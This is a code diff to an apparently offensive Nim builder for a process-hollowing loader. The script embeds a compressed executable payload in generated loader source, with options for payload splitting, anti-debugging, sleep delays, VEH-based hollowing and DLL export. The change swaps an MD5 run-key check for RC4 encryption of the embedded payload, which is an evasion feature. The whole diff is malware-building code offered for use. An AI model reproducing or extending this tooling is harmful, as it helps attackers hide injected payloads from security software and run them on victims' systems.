@@ -1,4 +1,4 @@
-import md5
+import RC4
 import osproc
 import argparse
 import ptr_math
@@ -69,6 +69,9 @@ var antiDebugg: string
 var key: string
 var isVeh: bool
 var isDebug: bool
+var isEncrypted: bool
+var payload: string
+
 
 # Define compiler args
 var compileExeCmd = "nim compile --app:console"         # exe format
@@ -106,7 +109,7 @@ when isMainModule:
         flag("-p", "--split", help="Split and hide the payload blob in hollower (takes long to compile!)")
         option("-t", "--sleep", help="Number of seconds to sleep before hollowing", default=some("0"))
         option("-g", "--anti-debug", help="Action to perform upon debugger detection", choices = @["none", "die", "troll"], default=some("none"))
-        option("-k", "--key", help="Hollower will run only when this supplied key is a command line argument", default=some(""))
+        option("-k", "--key", help="RC4 key to [en/de]crypt the payload (supplied as a command line argument to the hollower)", default=some(""))
         flag("-v", "--veh", help="Hollow will occur within VEH")
         flag("-d", "--debug", help="Compile as debug instead of release (loader is verbose)")
     # Parse arguments
@@ -156,33 +159,36 @@ when isMainModule:
 
     # Compress & encode exe payload
     var compressedPe = compress(peStr)
-    var compressedBase64PE = encode(compressedPe)
 
-    # Md5 key
-    var keyMd5 = ""
+
+    # (Encrypt and) Encode payload if key supplied
     if key != "":
-        keyMd5 = getMd5(key)
+        payload = encode(toRC4(key, compressedPe))
+        isEncrypted = true
+    else:
+        payload = encode(compressedPe)
+        isEncrypted = false
 
     # Write the parameters to the loader params
     var paramsPath = "Loader/params.nim"
-    var compressedBase64PELine: string
+    var payloadLine: string
     if isSplit:
-        compressedBase64PELine = fmt"""var compressedBase64PE* = splitString(protectString("{compressedBase64PE}"))"""
+        payloadLine = fmt"""var payload* = splitString(protectString("{payload}"))"""
     else:
-        compressedBase64PELine = fmt"""var compressedBase64PE* = protectString("{compressedBase64PE}")"""
+        payloadLine = fmt"""var payload* = protectString("{payload}")"""
     var paramsToHollower = fmt"""
 import os
 import nimprotect
 
-{compressedBase64PELine}
+{payloadLine}
 var sponsorPath* = {sponsorPath}
 var sponsorParams* = protectString(r" {sponsorParams}")
 var dllExportName* = protectString("{outDllExportName}") 
 var isBlockDlls* = {isBlockDlls}
 var antiDebugAction* = protectString("{antiDebugg}")
-var keyMd5* = protectString("{keyMd5}")
 var sleepSeconds* = {sleepSeconds}
 var isVeh* = {isVeh}
+var isEncrypted* = {isEncrypted}
     """
     writeFile(paramsPath, paramsToHollower)
 
@@ -233,7 +239,7 @@ proc {outDllExportName}(): void {{.stdcall, exportc, dynlib.}} =
         if injectionMethod in ["4", "5", "6"]:
             echo "[i] Run the hollower with '-M' argument"
         if key != "":
-            echo fmt"[i] Run the hollower with '{key}' argument"
+            echo fmt"[i] Run the hollower with '-K:{key}' argument"
     else:
         echo "[-] Error compiling. compilation output:"
         echo res[0]
